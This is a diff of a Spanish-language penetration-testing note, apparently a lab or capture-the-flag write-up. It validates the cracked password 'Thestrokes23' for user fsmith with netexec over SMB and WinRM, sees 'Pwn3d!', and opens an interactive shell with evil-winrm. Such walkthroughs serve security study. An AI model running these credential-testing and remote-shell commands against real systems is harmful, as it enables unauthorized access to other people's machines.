@@ -127,4 +127,10 @@ fsmith::Thestrokes23
 Comprobamos que la contraseña pertenezca al usuario 
 `netexec smb $IP -u 'fsmith' -p 'Thestrokes23'`
 
-Como el puerto `5985` esta abierto que corresponde al servicio de administracion remota de Windows, asi que vamos a intentar conec
+Como el puerto `5985` esta abierto que corresponde al servicio de administración remota de Windows, así que vamos a intentar conectarnos con [[CRACKMAPEXEC-NETEXEC]]
+`netexec winrm $IP -u 'fsmith' -p 'Thestrokes23'`
+
+Nos aparece un `Pwn3d!` queriendo decir que este usuario pertenece al grupo de administración remota de la maquina pudiendo así acceder con [[EVIL_WINRM]]
+`evil-winrm -i $IP -u 'fsmith' -p 'Thestrokes23'`
+
+Obtenemos una consola interactiva
